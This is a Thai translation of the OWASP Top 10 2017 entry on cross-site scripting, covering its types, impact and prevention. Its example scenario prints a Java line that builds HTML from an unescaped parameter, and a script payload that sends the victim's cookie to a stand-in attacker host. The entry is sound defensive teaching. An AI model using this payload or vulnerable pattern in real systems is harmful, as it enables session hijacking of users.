# A7:2017 Cross-Site Scripting (XSS)

| ผู้โจมตี/ช่องทาง | จุดอ่อนด้านความปลอดภัย           | ผลกระทบ               |
| -- | -- | -- |
| การเข้าถึงช่องโหว่ : ความยากในการโจมตี 3 | แพร่กระจายง่าย 3 : ตรวจพบได้ง่าย 3 | ผลกระทบทางเทคนิค 2 : ผลกระทบทางธุรกิจ ? |
| โปรแกรมตรวจสอบช่องโหว่อัตโนมัติ สามารถใช้ตรวจจับและโจมตีช่องโหว่ประเภท XSS ได้ทั้งสามรูปแบบ (Reflected XSS, Stored XSS และ DOM XSS) พร้อมทั้งมี เฟรมเวิร์ค สำหรับโจมตีช่องโหว่นี้โดยเฉพาะแจกฟรีอีกด้วย เช่น BeEF (Browser Exploitation Framework) | ช่องโหว่ XSS แพร่กระจายได้มากเป็นอับดับสอง ใน OWASP Top 10 และพบว่าสองในสามส่วนแอพพลิเคชั่นที่ถูกทดสอบความปลอดภัยมีช่องโหว่ XSS โปรแกรมตรวจสอบช่องโหว่อัตโนมัติสามารถใช้หาช่องโหว่ XSS บางส่วนได้ โดยเฉพาะในเว็บเทคโนโลยีหลัก ๆ อย่าง PHP, J2EE / JSP และ ASP.NET | โดยทั่วไปผลกระทบของช่องโหว่ XSS มีความรุนแรงปานกลางสำหรับประเภท Reflected กับ DOM XSS และมีความรุนแรงสูงสำหรับประเภท Stored XSS ผลกระทบหลัก ๆ คือผู้โจมตีสามารถสั่งการทำงานฝั่ง client บน web browser ของเหยื่อได้ เช่นสามารถขโมย รหัสผ่านที่พิมพ์หรือจากใน DOM, ขโมย user session หรือโจมตีเหยื่อด้วยมัลแวร์ที่เขียนจาก JavaScript |

## แอพพลิเคชั่นนี้มีช่องโหว่หรือไม่?

ช่องโหว่ XSS มีสามประเภท ซึ่งทั้งหมดนี้โจมตีไปที่ web browser ของเหยื่อ:

* **Reflected XSS**: เกิดจากแอพพลิเคชั่นหรือ API รับค่ามาจากผู้ใช้งานโดยไม่ได้ตรวจสอบมาแสดงผลเป็นหน้าเว็บ HTML ถ้าถูกโจมตีสำเร็จ ผู้โจมตีสามารถสั่งการทำงานด้วยโค้ด HTML และ JavaScript ใด ๆ บน web browser ของเหยื่อได้ตามต้องการ โดยปกติแล้ว XSS ประเภทนี้ เหยื่อจะต้องเข้า link หน้าเว็บที่ผู้โจมตีสร้างหรือใส่ HTTP parameter บนเว็บที่มีช่องโหว่ XSS แล้วส่งมาให้เหยื่อเปิด อาจใช้ร่วมกับการโจมตีแบบอื่นเช่น watering hole, การแพร่เว็บโฆษณา และอื่น ๆ 
* **Stored XSS**: เกิดจากแอพพลิเคชั่นหรือ API เก็บค่าที่รับมาจากผู้ใช้งานโดยไม่ได้ตรวจสอบแล้วนำมาแสดงผลในภายหลัง ให้ผู้ใช้งานหรือผู้ดูแลระบบเห็น โดยปกติแล้ว Stored XSS จัดว่าเป็นช่องโหว่ที่มีความรุนแรงสูงหรือร้ายแรงมาก
* **DOM XSS**: เฟรมเวิร์ค JavaScript , แอพพลิเคชั่นที่มีหน้าเดียว และ API ต่าง ๆ ที่รับค่าที่ผู้โจมตีควบคุมได้ส่งมาแสดงโดยไม่ได้ตรวจสอบ มาแสดงตอน JavaScript กำลังทำงานอยู่และค่าที่ผู้โจมตีส่งมาทำงานเป็น JavaScript เกิดขึ้นใน DOM จะเรียกได้ว่าเป็น DOM XSS 

ปกติแล้วการโจมตีแบ XSS ส่งผลให้ผู้โจมตีสามารถขโมย user session เหยื่อได้, ยึดบัญชีของเหยื่อได้, ข้ามผ่านการยืนยันตัวแบบ MFA (Multi-Factor Authentication), แก้ไขค่าใน DOM node บน HTML หรือแก้ไขหน้าเว็บ (เช่นสร้างหน้าล็อคอินปลอม), โจมตีผู้ใช้งานเว็บผ่าน web browser เช่นหลอกให้ดาวโหลดไฟล์มัลแวร์, ดักรหัสผ่านบนคีย์บอร์ด และการโจมตี client-side อื่น ๆ อีกมากมาย

## ป้องกันอย่างไร

การป้องกันช่องโหว่ XSS จะต้องทำการแยก ข้อมูลที่รับมาจากผู้ใช้งานออกจากโค้ด HTML และ JavaScript ที่ทำงานปกติในหน้าเว็บ ซึ่งสามารถทำได้โดย:

* ใช้เฟรมเวิร์คที่ทำการป้องกัน XSS มาให้ตอนแสดงค่าที่รับมาจากผู้ใช้งานอยู่แล้ว เช่นใน Ruby on Rails หรือ React JS เวอร์ชั่นล่าสุด และจำเป็นต้องศึกษาข้อจำกัดของเฟรมเวิร์คในการป้องกัน XSS พร้อมทั้งวิธีการจัดการค่าที่รับเข้ามาในกรณีที่เฟรมเวิร์คไม่ได้ครอบคลุมในจุดนั้น ๆ
* แปลงค่าที่รับเข้ามาผ่าน HTTP request ให้เหมาะสมกับส่วนที่นำไปแสดงผลของหน้าเว็บ (เช่นในส่วนของ body, attribute, JavaScript, CSS, หรือ URL) จะช่วยแก้ปัญหาช่องโหว่ XSS ได้ เพิ่มเติมคือในเอกสาร [OWASP  Cheat Sheet 'XSS Prevention'](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) มีบอกรายละเอียดว่ารับค่าเข้ามาแสดงที่ส่วนไหน จะต้องใช้เทคนิคแปลงใดค่า
* เมื่อมีการแก้ไขข้อมูลบนหน้าเว็บผ่าน JavaScript จะต้องทำการแปลงค่าอย่างปลอดภัยซึ่งแตกต่างกันตามแต่ส่วนที่นำไปแสดง เพื่อป้องกัน DOM XSS ถ้าไม่สามารถแปลงได้ ให้ใช้เทคนิคอื่น ๆ ที่อธิบายไว้ในเอกสาร  [OWASP Cheat Sheet 'DOM based XSS Prevention'](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).
* เปิดใช้งานฟีเจอร์ [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) ซึ่งเป็นการป้องกัน XSS โดยใช้หลักการของ defense-in-depth ถ้าใช้อย่างถูกวิธี จะป้องกัน XSS ได้ถ้าไม่มีช่องโหว่อื่น ๆ ที่ทำให้ผู้โจมตีสามารถใส่โค้ดอันตรายผ่านการนำไฟล์มาแสดงผลบนหน้าเว็บได้ (เช่น path traversal ที่เขียนทับไฟล์ JavaScript ที่นำมาแสดงหรือผู้โจมตีสามารถแก้ไขค่าใน JavaScript library บน CDN ที่เว็บเรียกโค้ดมาใช้ได้) 

## ตัวอย่างของกระบวนการโจมตี

**Scenario #1**: กรณีที่แอพพลิเคชั่นรับค่าจากผู้ใช้งานโดยไม่ได้ตรวจสอบหรือแปลงให้ปลอดภัยแล้วนำมาแสดงบนหน้าเว็บโดยตรงจากโค้ดภาษา Java ต่อไปนี้:

`(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
ผู้โจมตีสามารถแก้ไขค่า HTTP parameter ชื่อ CC ผ่าน web browser ไปเป็นค่า:

`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`

แล้วส่ง link ไปให้เหยื่อเปิด การทำแบบนี้จะเป็นการใส่ JavaScript เพื่อโจมตีทำให้ session ID ที่อยู่ใน cookie ของ web browser ของคนที่เปิด link ถูกส่งไปยังเว็บของผู้โจมตี ส่งผลให้ ผู้โจมตีสามารถข้ามผ่านการล็อคอินเข้าไปเป็น user session ของเหยื่อได้

**ข้อสังเกต**: ถ้าเกิดในแอพพลิเคชั่นมีช่องโหว่ XSS ผู้โจมตีสามารถโจมตี XSS เพื่อข้ามผ่านการป้องกันของช่องโหว่ CSRF ใด ๆ และทำการโจมตีแบบ CSRF ต่อได้

## อ้างอิง

### จาก OWASP

* [OWASP Proactive Controls: Encode Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Proactive Controls: Validate Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Application Security Verification Standard: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
* [OWASP Testing Guide: Testing for Reflected XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
* [OWASP Testing Guide: Testing for Stored XSS](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
* [OWASP Testing Guide: Testing for DOM XSS](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
* [OWASP Cheat Sheet: XSS Prevention](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: DOM based XSS Prevention](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)

### External

* [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
* [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
